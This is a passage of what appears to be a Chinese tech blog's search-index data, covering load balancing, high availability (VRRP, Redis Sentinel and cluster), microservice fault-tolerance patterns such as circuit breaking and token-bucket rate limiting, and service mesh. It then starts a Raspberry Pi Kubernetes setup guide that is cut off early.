href=\"https://yizhi.ren/2019/05/03/lvs/\">LVS的原理-工作模式</a>。</p>\n<p>另一类是基于反向代理的原理，通过转发数据包的方式来进行请求的路由。比如Nginx和HAProxy，相比LVS工作在内核空间，这两个软件工作在用户空间，因此无权修改底层数据包，只能依靠上层数据的转发来实现，从原理上就可以推测其性能是不及LVS的（这里主要指相同CPU消耗上的处理能力）。Nginx和HAProxy做为反向代理，工作原理即接收请求数据-&gt;转发给后面的某一台主机-&gt;接收主机的响应-&gt;转发给客户端。但是相比LVS，他们支持更多的负载均衡特性，最典型的是支持基于HTTP的URL进行分流，这一点对于很多服务来说是很友好的。</p>\n<p>服务端方式的负载均衡与部署系统的集成一个是在服务的上线过程中，部署系统首先把部分容器从LVS或者nginx的下游摘除，避免流量接入，随后新容器启动成功，再把容器添加到下游机器列表中。一个是在扩缩容的操作中，一旦扩缩容发生就更新LVS或者nginx的下游机器列表。</p>\n<p><code>客户端</code></p>\n<p>客户端方式是指服务调用方持有服务的所有机器列表，并根据一定的负载均衡策略选取其中的一台进行访问。</p>\n<p>这种方式的实现离不开服务发现机制，服务调用方从服务注册中心获取服务最新的机器列表，然后按一定的策略进行访问，因此这种方式的关键是客户端要知道最新的全量的机器列表。</p>\n<p>客户端方式的负载均衡与部署系统的集成一个是在服务的上线过程中，部署系统下线一台容器的时候，服务进程会向注册中心请求下线机器节点，启动一台容器的时候，服务进程又会向注册中心请求上线机器节点。一个是在扩缩容的操作中，一旦扩缩容发生服务进程就会向注册中心发出上线或者下线的请求。这样服务的调用方就可以获取到最新的机器列表了。</p>\n<h5 id=\"高可用\"><a href=\"#高可用\" class=\"headerlink\" title=\"高可用\"></a>高可用</h5><p>高可用是一个包含多种场景的课题，在这里我首先讲负载均衡下的高可用，然后再讲更广泛的高可用。</p>\n<h6 id=\"负载均衡下的高可用\"><a href=\"#负载均衡下的高可用\" class=\"headerlink\" title=\"负载均衡下的高可用\"></a>负载均衡下的高可用</h6><p>在这种场景下，我们刚才已经做到了在上线和扩缩容场景下动态更新服务节点列表，因此增添删除节点已经不会影响服务的可用性。我们唯一还要考虑的是服务中途故障的话我们怎么动态移除故障节点。我们的方案是进行探活，一旦检测到故障就把节点移除，一旦节点恢复就把节点添加回来。关于探活可以参见前面<code>服务发现</code>的<code>探活机制</code>一节的内容。无论是F5还是LVS还是Nginx和HAProxy，都是需要跟探活机制协作来完成服务的高可用的。只不过有的是自带探活机制，有的需要利用插件，有的得结合第三方的程序或者脚本。</p>\n<h6 id=\"更广泛的高可用\"><a href=\"#更广泛的高可用\" class=\"headerlink\" title=\"更广泛的高可用\"></a>更广泛的高可用</h6><p>放眼的其他场景下，高可用在形式上主要表现为主备高可用，双主高可用和集群高可用。</p>\n<p><code>主备高可用</code></p>\n<p>主备高可用是指使用冗余的方式提供机器的备份，备机正常不提供服务，只有主机提供服务，当主机故障时，服务自动切换到备机上。当主机恢复时，根据需要，可以让恢复的主机继续提供服务，备机不工作；或者可以让恢复的主机成为原备机的备机，原备机继续提供服务。比如下图中LVS在较小规模下的主备高可用方案：</p>\n<p><img src=\"/linkimage/microservices/lvscommonha.png\" alt=\"lvssmallha\"></p>\n<p>LVS主和LVS备通过VRRP协议来实现主备高可用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自百度百科：https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%99%A8%E5%86%97%E4%BD%99%E5%8D%8F%E8%AE%AE/2991482</span><br><span class=\"line\"></span><br><span class=\"line\">一组VRRP路由器协同工作，共同构成一台虚拟路由器。该虚拟路由器对外表现为一个具有唯一固定的IP地址和MAC地址的逻辑路由器。处于同一个VRRP组中的路由器具有两种互斥的角色：主控路由器和备份路由器，一个VRRP组中有且只有一台处于主控角色的路由器，可以有一个或者多个处于备份角色的路由器VRRP协议从路由器组中选出一台作为主控路由器，负责ARP解析和转发IP数据包，组中的其他路由器作为备份的角色并处于待命状态，当由于某种原因主控路由器发生故障时，其中的一台备份路由器能在瞬间的时延后升级为主控路由器，由于此切换非常迅速而且不用改变IP地址和MAC地址，故对终端使用者系统是透明的。</span><br></pre></td></tr></table></figure>\n\n<p><code>双主高可用</code></p>\n<p>双主高可用的目的是为了消除主备模式浪费备机的缺点，同一时间总是只能有一台机器处于工作状态。</p>\n<p>假设我们能让主备机器同时工作，并且互为主备，任何一台出问题，另一台还是可以工作。</p>\n<p>解决方法还是通过VRRP，我们知道VRRP的原理是两台（或者更多）机器组成一个虚拟路由器，争相宣称自己是某个IP的拥有者，成为主控路由器，同一时间只能有一个机器成为主控路由器，成为有效的IP拥有者。那么我们只要让这两个机器维护两个虚拟路由器，让机器1成为路由器1的的主控路由器，机器2成为路由器1的备份路由器；同时让机器2成为路由器2的主控路由器，机器1成为路由器2的备份路由器:</p>\n<p><img src=\"/linkimage/microservices/shuangzhu.png\" alt=\"shuangzhu\"></p>\n<p>这样服务的上游无论使用何种方式，只要同时使用ip1和ip2就可以充分的利用两台机器来同时提供服务，任何一台故障后另一台都能够继续承担两个ip的工作。</p>\n<p>但是这里可能有个事情会让你不浪费机器的梦想落空，因为你需要让你的机器能够抗下两倍的访问量，不然一台故障后，另一台是扛不住的，这样就相当于你的机器需要有一半的性能是用来容灾的，本质上还是浪费了一半的性能。</p>\n<p><code>集群高可用</code></p>\n<p>集群高可用是指多台机器组成集群共同提供服务，只要在集群容忍的限度内，同时故障若干台机器都不影响集群正常提供服务。</p>\n<p>一种集群组成方式是基于我们前面讲到的负载均衡+探活机制，这种方式下通过及时的摘除故障机器来保证可用性。</p>\n<p>一种集群组成方式是若干个主备机器的集合，也就是集群内的机器是主1，备1，主2，备2，主3，备3，等等。那是不是配置多个VRRP协议呢，不是的，因为有时候我们希望主备进程能够知道自己当前处于主还是备，并相应的做一些操作，这时候需要通过引入一个程序，检测主机状态，一旦主机出故障，就把备机升级成主机，如果备机有多个备1备2备3，那么还要让其余的备机挂到新的主机下去。比如redis的哨兵程序就是做这个工作的，下图展示了哨兵监视其中一组主备的工作场景（哨兵是支持监视多组主备机器的）：</p>\n<p><img src=\"/linkimage/microservices/shaobinwatch.png\" alt=\"shaobinwatch\"></p>\n<p><img src=\"/linkimage/microservices/shaobinchange.png\" alt=\"shaobinchange\"></p>\n<p>图片来自 <a href=\"https://blog.csdn.net/hayre/article/details/78753683\">redis-Sentinel哨兵原理与实战</a></p>\n<p>不过呢，并不是所有的主备集合组成的集群都需要哨兵程序，服务进程本身也可以完成哨兵的工作。比如redis3开始支持的redis cluster，它组成的redis集群可以不依赖哨兵程序实现高可用。redis的服务节点之间会不停的通过gossip协议互相通信，用来检测其可用性和传递节点信息（节点名字，节点状态，节点角色等）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自： https://www.jianshu.com/p/8279d6fd65bb</span><br><span class=\"line\">Gossip 过程是由种子节点发起，当一个种子节点有状态需要更新到网络中的其他节点时，它会随机的选择周围几个节点散播消息，收到消息的节点也会重复该过程，直至最终网络中所有的节点都收到了消息。这个过程可能需要一定的时间，由于不能保证某个时刻所有节点都收到消息，但是理论上最终所有节点都会收到消息，因此它是一个最终一致性协议。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>当A节点检测不到B的时候，A会把B的不可用状态通过gossip协议进行传播，当半数以上节点认为B不可用时就认为B真的不可用了，通过消息传播，所有节点都会认为B已经不可用。如果B是备节点那么不会发生什么，如果B是主节点，那么B的备节点（可能有多个）就会参与到选举的过程中，经过半数同意后选举成功，并广播告知别的节点，之后新的主节点接替原来B的工作。下图为redis cluster示意图：</p>\n<p><img src=\"/linkimage/microservices/rediscluster.jpg\" alt=\"rediscluster\"></p>\n<p>图片来自<a href=\"http://blog.sina.com.cn/s/blog_811e96890102wccs.html\">新浪博客</a></p>\n<p><code>通过本质分类</code></p>\n<p>上面总结了高可用的多种形式的分类，但是却并不是基于本质的分类。最本质的应该其实应该在于是否转嫁了高可用的特性。</p>\n<p>我们设想假如运行VRRP协议的机器所在网段的路由器故障了，那么依赖于消息组播的VRRP协议也就无法正常工作了，他的高可用还能有效吗？ 假如redis集群的哨兵故障了，那么依赖于哨兵的redis集群还能实现高可用吗？假如LVS架构下DirectServer故障了，那么还能正常摘除故障机器实现高可用吗？当然是不行了。</p>\n<p>所以这类高可用本质上是转嫁了高可用，或者说是依赖于一个外部的高可用的程序来实现我这个服务的高可用，VRRP依赖高可用的路由器，基于哨兵的redis集群依赖高可用的哨兵，LVS依赖高可用的DirectServer。</p>\n<p>那么另一类就是自身实现了高可用机制，不需要外部程序的依赖。这类程序往往在集群内部实现了选举机制，能够有效应对主机故障的场景。比如前面讲到的基于gossip的redis cluster就是一个自身高可用的例子；比如redis的哨兵本身也是一个自身高可用的集群，而不是单一的进程；另一个鼎鼎大名的自身高可用的例子是ZooKeeper，很多其他的系统通过ZooKeeper其实了他们的高可用。</p>\n<p>接下来我们看微服务拓扑图中的蓝色部分，这部分属于微服务的优缺点，包括微服务架构的优势和微服务架构的缺点。由于优缺点也起到了对微服务的总结作用，因此我把优缺点放到跟<code>微服务周边</code>相同的目录层级上来讲。</p>\n<h2 id=\"微服务的优点\"><a href=\"#微服务的优点\" class=\"headerlink\" title=\"微服务的优点\"></a>微服务的优点</h2><p>当回头看微服务的优缺点时，我们发现大部分的优缺点在<code>微服务的特征</code>那一节已经提到了。比如微服务的优点总结来说有3个：扩展性，可靠性，独立性。我们尝试着直接摘<code>微服务特征</code>中的语句来看看。</p>\n<h3 id=\"扩展性：\"><a href=\"#扩展性：\" class=\"headerlink\" title=\"扩展性：\"></a>扩展性：</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自服务组件化小节：</span><br><span class=\"line\">组件化的服务在扩展时跟单体应用有很大的差别，主要表现在服务的按需扩展这一点。</span><br></pre></td></tr></table></figure>\n\n<p>这一点是在资源分配上的扩展性。由于一个微服务是在网络上独立的进程，因此当某个服务的性能不足或过量的时候，我们完全可以单独地进行扩缩容。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自设计发展化小节：</span><br><span class=\"line\">可替换性其实是一个更一般原则的特例，这个原则是通过变化来驱动模块化。你应该保持同一时间的变化只位于同一个模块中。很少变化的部分应该与大量变化的部分处于不同的模块中，而如果两个服务总是一起变化，那么这两个模块应该被合并。而可替换性其实就是一种可以独立变更的特性。</span><br></pre></td></tr></table></figure>\n\n<p>这一点是服务增减上的扩展性。我们可以在业务发展的过程中根据变化来驱动服务的拆分和合并，也就是在服务的增减上是有很大的扩展性的。</p>\n<h3 id=\"可靠性：\"><a href=\"#可靠性：\" class=\"headerlink\" title=\"可靠性：\"></a>可靠性：</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自失效常态化小节：</span><br><span class=\"line\">使用服务作为组件的一个结果在于应用需要有能容忍服务的故障的设计，任何服务调用都可能因为服务的不可用而失败，调用者就需要尽可能优雅的来处理这种结果。这对比单体应用是一个劣势，因为这引入了额外的复杂性。</span><br></pre></td></tr></table></figure>\n\n<p>失效常态化本身是微服务的一个缺点，但是当我们做到了”尽可能优雅的来处理这种结果“，我们就将劣势转变成了优势，我们的解决手段就是异常隔离。我们客观的认为服务随时可能出问题，我们要做的就是做好容错处理，具体措施在缺点那一节中展开。有了异常隔离，整个系统的可靠性就得到了提升，假如某个服务故障，整个系统因为有了异常隔离，依然可以工作，即便服务能力有所下降。</p>\n<h3 id=\"独立性：\"><a href=\"#独立性：\" class=\"headerlink\" title=\"独立性：\"></a>独立性：</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自服务组件化小节：</span><br><span class=\"line\">微服务做这种拆分的好处是这些服务可以被独立的部署。如果你使用库来构建你的应用，当你修改其中一个库的时候，你就必须重新部署整个应用。但是如果应用被拆分成多个服务，你只需要部署你修改的那个服务就可以了。当然这并不是绝对的，如果你修改了接口，可能导致相关的服务得跟着一起重新部署。一个好的微服务架构需要最小化这种关联，通过内聚服务的边界，以及通过服务合约来进行服务的进化，减少这类改动。</span><br></pre></td></tr></table></figure>\n\n<p>大意就是指微服务可以独立部署，独立开发，独立测试。</p>\n<h2 id=\"微服务的缺点\"><a href=\"#微服务的缺点\" class=\"headerlink\" title=\"微服务的缺点\"></a>微服务的缺点</h2><h3 id=\"调用成本大\"><a href=\"#调用成本大\" class=\"headerlink\" title=\"调用成本大\"></a>调用成本大</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自服务组件化：</span><br><span class=\"line\">服务组件相比库有个缺点，通过网络进行远程调用的成本更大，因此为了减少交互，服务接口通常是粗粒度的，这相对来说接口更复杂更难用。</span><br></pre></td></tr></table></figure>\n\n<p>由于微服务的独立性，服务之间的调用需要通过网络来完成，这相比单体应用在本地内存的调用要低效的太多。所以我们或者通过改造接口为粗粒度的来减少调用次数，或者把微服务应用于业务对网络耗时不敏感的系统，也就是网络耗时相比业务耗时占比很小的系统。</p>\n<h3 id=\"分布式事务弱\"><a href=\"#分布式事务弱\" class=\"headerlink\" title=\"分布式事务弱\"></a>分布式事务弱</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自管理去中心化：</span><br><span class=\"line\">应用分拆后，数据也被分拆，这对数据更新带来挑战。单体应用是使用事务来保证一致性，而分布式事务是出了名的难以实现，所以微服务架构强调服务之间的无事务协调，并且明确认识到一致性可能只是最终一致性，而问题也将通过补偿操作来处理。处理一致性问题是一个新的挑战，但是通常业务上允许存在一定程度的不一致来快速响应需求，同时使用某种恢复过程来处理错误。只要处理错误的代价低于强一致性带来的业务损失（主要是性能）那么这就值得。</span><br></pre></td></tr></table></figure>\n\n<p>由于数据拆分带来数据一致性无法保证，除非实现一个严谨的分布式事务的方案。但是分布式事务的实现方案（常见的有二阶段提交、三阶段提交）往往不够轻量，流程过于复杂，因此微服务强调无事务协调，或者说只追求最终一致性。</p>\n<h3 id=\"出错频率高\"><a href=\"#出错频率高\" class=\"headerlink\" title=\"出错频率高\"></a>出错频率高</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">来自失效常态化小节：</span><br><span class=\"line\">使用服务作为组件的一个结果在于应用需要有能容忍服务的故障的设计，任何服务调用都可能因为服务的不可用而失败，调用者就需要尽可能优雅的来处理这种结果。这对比单体应用是一个劣势，因为这引入了额外的复杂性。</span><br></pre></td></tr></table></figure>\n\n<p>在讲可靠性这个优点的时候我们就看过这段话，正如话中所说，失效常态化是相较单体应用的一个劣势。那么我们要怎么来应对这个问题呢。我们的解决手段就是异常隔离，这包括了多种手段：超时机制，重试机制，熔断机制，隔离机制，限流机制，降级机制。</p>\n<h4 id=\"超时机制\"><a href=\"#超时机制\" class=\"headerlink\" title=\"超时机制\"></a>超时机制</h4><p>当某个下游服务过于繁忙的时候，他可能会来不及处理上游发起的某个请求，导致上游迟迟等不到他的返回，这会影响上游服务的吞吐量，这会导致整个请求的链路耗时很大，但是上游或者请求的源头是不可能无限期的等待的，他会有个他能忍受的最长时间，所以我们调用下游服务时候需要设定一个超时时间，一旦等待超过了超时时间，请求就当做下游错误进行返回。</p>\n<h4 id=\"重试机制\"><a href=\"#重试机制\" class=\"headerlink\" title=\"重试机制\"></a>重试机制</h4><p>在微服务的调用中，一旦涉及到网络传输，网络通道很多是不稳定的，会有偶尔的抖动，抖动时的调用可能就会超时，很多场景就需要重试机制来保证。</p>\n<p>重试是分场景的，有的错误就算重试在多次也无效，比如权限问题，密码错误等，不断重试反而造成资源浪费，总耗时更大。重试的前提故障只是暂时的，而不是永久的，我们重试下次可能会成功。</p>\n<h4 id=\"熔断机制\"><a href=\"#熔断机制\" class=\"headerlink\" title=\"熔断机制\"></a>熔断机制</h4><p>服务熔断则对于目标服务的请求和调用大量超时或失败，这时应该熔断该服务的所有调用，并且对于后续调用应直接返回，从而快速释放资源，确保在目标服务不可用的这段时间内，所有对它的调用都是立即返回，不会阻塞的。随后每隔一段时间释放少量请求到熔断的服务中，如果服务恢复正常则恢复对服务的请求。如果下游服务包含多个IP，那么熔断的对象可以是服务的某个IP。</p>\n<p>熔断机制的设计需要包含三个方面，一个是熔断判断机制，比如50%失败率熔断，比如连续失败10次熔断等；一个是熔断恢复机制，比如间隔10s释放一个请求到熔断的服务中，如果还是失败继续保持熔断，如果成功就释放更多的请求进来；一个是熔断报警，触发熔断要及时报警，及时发现和修复故障服务。</p>\n<h4 id=\"隔离机制\"><a href=\"#隔离机制\" class=\"headerlink\" title=\"隔离机制\"></a>隔离机制</h4><p>隔离机制的目的是让局部的问题不要影响全部，比如接口的隔离，A接口处问题后，不要影响B接口继续提供服务；比如对上游的隔离，如果某个上游疯狂请求该服务，该服务应该做好隔离机制，避免影响其他上游正常请求该服务。可以通过以下方式来实现：</p>\n<ol>\n<li>为每个接口设立单独的线程池，不同线程池之间互不影响。</li>\n<li>为每个接口设立单独的限流值，不同接口独立限流，一个接口流量过大不会导致别的接口资源不足。</li>\n<li>为每个上游设立单独的限流值，每个上游独立限流，一个上游流量过大不会导致处理别的上游的资源不足。</li>\n</ol>\n<h4 id=\"限流机制\"><a href=\"#限流机制\" class=\"headerlink\" title=\"限流机制\"></a>限流机制</h4><p>服务限流是指当系统资源不够，不足以应对大量请求，即系统资源与访问量出现矛盾的时候，我们为了保证有限的资源能够正常服务，因此对系统按照预设的规则进行流量限制或功能限制的一种方法。</p>\n<p>限流的实现方法有计数器，队列，漏桶，令牌桶。</p>\n<p><code>计数器</code></p>\n<p>最简单的实现方式，来一个请求计数器加一，处理完减一，当计数器大于某个阈值，则拒绝处理新的请求。</p>\n<p><code>队列</code></p>\n<p>基于FIFO队列，所有请求都进入队列，后端程序从队列中取出待处理的请求依次处理。队列可以设置最大长度，超过的就拒绝服务。队列还有个特性是可以支持优先级，重要的请求可以优先被处理。</p>\n<p><code>漏桶</code></p>\n<p>把请求比作是水，水来了都先放进桶里，并以限定的速度出水，当水来得过猛而出水不够快时就会导致水直接溢出，即拒绝服务。漏斗算法跟FIFO队列的机制基本是一样的，都是以一定的速度消费积压的请求。</p>\n<p><img src=\"/linkimage/microservices/loutong.png\" alt=\"loutong\"></p>\n<p>图片来自<a href=\"https://blog.csdn.net/yanpenglei/article/details/81583960\">接口限流算法：漏桶算法&amp;令牌桶算法</a></p>\n<p><code>令牌桶</code></p>\n<p>令牌桶算法的原理是系统以恒定的速率产生令牌，然后把令牌放到令牌桶中，令牌桶有一个容量，当令牌桶满了的时候，再向其中放令牌，那么多余的令牌会被丢弃；当想要处理一个请求的时候，需要从令牌桶中取出一个令牌，如果此时令牌桶中没有令牌，那么则拒绝该请求。</p>\n<p><img src=\"/linkimage/microservices/lingpaitong.png\" alt=\"lingpaitong\"></p>\n<p>图片来自<a href=\"https://blog.csdn.net/yanpenglei/article/details/81583960\">接口限流算法：漏桶算法&amp;令牌桶算法</a></p>\n<p>令牌桶相比漏斗和队列有个好处是在空闲的时候令牌桶可以积压充足的令牌，这些令牌可以在一定程度上满足短时间的一个流量高峰，不会让这波请求发生排队等候的情况。</p>\n<h4 id=\"降级机制\"><a href=\"#降级机制\" class=\"headerlink\" title=\"降级机制\"></a>降级机制</h4><p>降级设计，本质上为了解决资源不足和访问量过大的问题。在有限的资源内对部分系统进行降级，使能够抗住大量的请求。暂时牺牲部分功能，系统能够平稳运行。</p>\n<p>降级需要牺牲的一些方面：</p>\n<p><code>一致性：</code> 从强一致性到最终一致性。</p>\n<p><code>停掉次要功能:  </code>停止访问不重要的功能，释放更多的资源。</p>\n<p><code>简化功能:  </code>一些功能简化掉，不返回全量数据，或者返回不那么准确的数据。</p>\n<p>如果此时你感受到了异常隔离的复杂性，那么你是时候了解一下ServiceMesh了.</p>\n<h4 id=\"ServiceMesh\"><a href=\"#ServiceMesh\" class=\"headerlink\" title=\"ServiceMesh\"></a>ServiceMesh</h4><p>ServiceMesh中文名一般叫服务网格，服务网格是一个基础设施，功能在于处理服务间通信，职责是负责实现请求的可靠传递，专门用于解决服务间通信中错误处理的复杂性。通常实现为轻量级的网络代理，与应用程序部署在一起，对应用程序透明。如下示意图：</p>\n<p><img src=\"/linkimage/microservices/servicemeshsidecar.png\" alt=\"servivecmeshsidecar\"></p>\n<p>图片来自 <a href=\"https://philcalcado.com/2017/08/03/pattern_service_mesh.html\">Pattern: Service Mesh</a></p>\n<p>在Service Mesh架构中，服务框架的功能都集中实现在SideCar里，并在每一个服务消费者和服务提供者的本地都部署一个SideCar，服务消费者和服务提供者只管自己的业务实现，服务消费者向本地的SideCar发起请求，本地的SideCar根据请求的路径向注册中心查询，得到服务提供者的可用节点列表后，再根据负载均衡策略选择一个服务提供者节点，并向这个节点上的SideCar转发请求，服务提供者节点上的SideCar完成流量统计、限流等功能后，再把请求转发给本地部署的服务提供者进程，从而完成一次服务请求。整个流程你可以参考下面这张图：</p>\n<p><img src=\"/linkimage/microservices/servicemeshcallflow.png\" alt=\"servicemeshcallflow\"></p>\n<p>图片来自 <a href=\"http://www.mamicode.com/info-detail-2670852.html\">微服务架构ServiceMesh</a></p>\n<p>既然SideCar能实现服务之间的调用拦截功能，那么服务之间的所有流量都可以通过SideCar来转发，这样的话所有的SideCar就组成了一个服务网格:</p>\n<p><img src=\"/linkimage/microservices/servicemeshcontrol.png\" alt=\"servicemeshnet\"></p>\n<p>图片来自 <a href=\"https://philcalcado.com/2017/08/03/pattern_service_mesh.html\">Pattern: Service Mesh</a></p>\n<p>这时候通过一个统一的地方与各个SideCar交互，就能控制网格中流量的运转了，这个统一的地方就在Sevice Mesh中就被称为Control Plane。</p>\n<p><img src=\"/linkimage/microservices/mervicemeshcontrolcando.png\" alt=\"servicemeshcontroldo\"></p>\n<p>图片来自 <a href=\"http://www.mamicode.com/info-detail-2670852.html\">微服务架构ServiceMesh</a></p>\n<p>Control plane的作用如上图所示，分别是：</p>\n<p><code>服务发现</code></p>\n<p>服务消费者把请求发送给SideCar后，SideCar会查询Control Plane的注册中心来获取服务提供者节点列表。</p>\n<p>关于服务的注册，一种形式是服务自己注册到注册中心，前提是这个注册中心是Control plane能够交互的，比如常用的Zookeeper，Eurake。一种形式是SideCar主动把服务注册到注册中心，服务提供者无需关心服务注册的事情，比如微博的<code>Weibo Mesh</code>。这时注册中心就可以是Control plane私有的了，反正注册和发现都是Control plane自己来交互。</p>\n<p><code>负载均衡</code></p>\n<p>通过Control Plane动态修改SideCar中的负载均衡配置。然后SideCar从Control Plane获取到服务提供者节点列表信息后，就按照配置用一定的负载均衡算法从可用的节点列表中选取一个节点发起调用。</p>\n<p><code>请求路由</code></p>\n<p>Control Plane动态改变服务提供者节点列表，然后SideCar从Control Plane中获取服务提供者信息。比如需要进行A/B测试、灰度发布或者流量切换时，就可以动态地改变请求路由。</p>\n<p><code>故障处理</code></p>\n<p>Control Plane动态配置故障处理的方式和参数，然后当服务之间的调用出现故障，SideCar就根据配置加以控制，通常的手段有超时重试、熔断等。</p>\n<p><code>安全认证</code></p>\n<p>在Control Plane配置一个服务可以被谁访问。然后在SideCar中审计调用者和调用方。</p>\n<p><code>监控上报</code></p>\n<p>经过SideCar的调用信息会发给Control Plane，再转发给监控系统。</p>\n<p><code>日志记录</code></p>\n<p>经过SideCar的日志信息会发给Control Plane，再转发给日志系统。</p>\n<p><code>配额控制</code></p>\n<p>在Control Plane配置每个服务的每个调用方的最大调用次数。然后在SideCar中审计调用次数。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://static001.infoq.cn/resource/ebook/df/70/dfa72acdd44c2cbd0b777d54e2846570.pdf\">架构师</a></p>\n<p><a href=\"http://blog.cuicc.com/blog/2015/07/22/microservices/\">微服务</a></p>\n<p><a href=\"https://martinfowler.com/articles/microservices.html\">Microservices</a></p>\n<p><a href=\"https://www.slideshare.net/terryice/eagleeye-with-taobaojavaone\">鹰眼下的淘宝</a></p>\n<p><a href=\"https://kb.cnblogs.com/page/515982/\">序列化和反序列化</a></p>\n<p><a href=\"https://www.jianshu.com/p/e71ea220f471\">微服务之负载均衡</a></p>\n<p><a href=\"http://toutiao.manqian.cn/wz_cnW6gaAY8J.html\">重试 熔断 限流 降级</a></p>\n<p><a href=\"https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E8%B7%AF%E7%94%B1%E5%99%A8%E5%86%97%E4%BD%99%E5%8D%8F%E8%AE%AE/2991482\">虚拟路由器冗余协议</a></p>\n<p><a href=\"https://philcalcado.com/2017/08/03/pattern_service_mesh.html\">Pattern: Service Mesh</a></p>\n<p><a href=\"https://www.imooc.com/article/43576?block_id=tuijian_wz\">Redis Cluster 原理分析</a></p>\n<p> <a href=\"http://www.mamicode.com/info-detail-2670852.html\">微服务架构ServiceMesh</a></p>\n<p><a href=\"https://www.javazhiyin.com/33919.html\">主流微服务配置中心对比</a></p>\n<p><a href=\"https://www.infoq.cn/article/micro-service-technology-stack\">微服务架构技术栈选型手册</a></p>\n<p><a href=\"https://my.oschina.net/yu120/blog/1788928?nocache=1523859217622\">微服务架构—优雅停机方案</a></p>\n<p><a href=\"https://www.jianshu.com/p/ed0a85be9578\">哨兵Redis Sentinel基本原理</a></p>\n<p><a href=\"http://www.sendsms.cn/box/dl/_25B1_25E0_25B3_25CC_25BC_25BC_25CA_25F5/_25D4_25AD_25C0_25ED_25CB_25BC_25CF_25EB/_25C9_25E8_25BC_25C6_25BC_25DC_25B9_25B9/RESTful_Web_Service.pdf\">RESTful_Web_Service中文版</a></p>\n<p><a href=\"https://wenku.baidu.com/view/dc0afaa6f524ccbff1218416.html\">华为内部资料-VRRP原理讲解</a></p>\n<p><a href=\"https://my.oschina.net/weiweiblog/blog/3012389\">服务降级，服务熔断，服务限流</a></p>\n<p><a href=\"https://junq.io/%E4%B8%80%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%9A%84%E5%A5%BD%E5%A4%84%E5%92%8C%E9%99%B7%E9%98%B1.html\">一分钟了解微服务的好处和陷阱</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/websphere/library/techarticles/1601_clark-trs/1601_clark.html\">微服务、SOA 和 API：是敌是友？</a></p>\n<p><a href=\"https://www.infoq.cn/article/how-to-realize-distributed-tracking\">微服务架构下，如何实现分布式跟踪？</a></p>\n<p><a href=\"https://blog.csdn.net/yanpenglei/article/details/81583960\">接口限流算法：漏桶算法&amp;令牌桶算法</a></p>\n<p><a href=\"https://www.jianshu.com/p/f8e55238f44f\">Nginx健康检查（health_check）实践</a></p>\n<p><a href=\"https://blog.51cto.com/6284444/2149987\">构建双主高可用HAProxy负载均衡系统</a></p>\n<p><a href=\"https://m.2cto.com/kf/201612/575219.html\">RabbitMQ下的生产消费者模式与订阅发布模式</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/webservices/1003_xiaojg_soabc/\">面向服务的体系架构（SOA）和业务组件（BC）的思考</a></p>\n<p><a href=\"https://storage.googleapis.com/pub-tools-public-publication-data/pdf/36356.pdf\">Dapper, a Large-Scale Distributed Systems Tracing Infrastructure</a></p>\n","categories":["架构"],"tags":["分布式"]},{"title":"树莓派搭建k8s集群","url":"/2022/01/25/setupk8s/","content":"<h1 id=\"树莓派搭建k8s集群\"><a href=\"#树莓派搭建k8s集群\" class=\"headerlink\" title=\"树莓派搭建k8s集群\"></a>树莓派搭建k8s集群</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>我们有很多时候需要搭建一个k8s集群，可能为了开发，可能为了测试，可能为了学习。在选择机器上可以有几个选择，一个是使用几台PC，一个是开几个虚拟机，一个是使用几个轻量的开发板。这里我主要以学习为目的，并且选择使用轻量开发板的方式，并且以最常用的树莓派作为代表，来搭建一个k8s集群。</p>\n<p>由于主要以学习考试为主，这里暂时不考虑搭建单机集群的方式，因为没法接触到涉及多个节点的操作场景。</p>\n<p>同时也不考虑k3s，我知道k3s是专为轻量设备而设计的，功能跟k8s基本是一样的，但是k3s和k8s只是功能基本相同，但是在使用和配置上，都有很多不同，并且使用的是完全分开的文档。k8s在使用上经常需要查在线文档的，即便对k3s的文档很熟悉了，在使用k8s的时候还是会存在查不到k8s文档的情况。因此学习k8s的时候，用k3s做练习是不合适的。</p>\n<p>至于选择树莓派作为载体是个人选择，你可以选择使用pc或者选择使用虚拟机。如果你选择使用pc或者虚拟机，那么下面的章节中，【刷写系统】和【配置系统】会有差异，仅供参考。再之后的步骤则都是通用的。</p>\n<p>最终我们将完成以下集群的搭建：</p>\n<p><img src=\"/linkimage/setupk8s/cluster-device.png\" alt=\"cluster-device\"></p>\n<p>一个路由器，3个树莓派，树莓派通过wifi连接路由器，3个树莓派中一个master node,两个worker node。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"刷写系统\"><a href=\"#刷写系统\" class=\"headerlink\" title=\"刷写系统\"></a>刷写系统</h2><p>系统我们使用树莓派专用的ubuntu系统，我的理由是k8s官方文档中插入的系统命令都是debian系的apt指令，外加ubuntu官方提供了树莓派的版本。所以可以看出ubuntu对k8s和对树莓派都是友好的。还有很多系统可以选择，更多选择可以阅读<a href=\"https://thenewstack.io/a-guide-to-linux-operating-systems-for-kubernetes/\">这个页面</a>详细了解  。但是后面的步骤我都是按照ubuntu来做的，其他系统的话需要自己做一些探索了。<br>首先把sd卡通过读卡器插到电脑上，然后到<a href=\"https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#2-prepare-the-sd-card\">烧录工具下载页面</a> 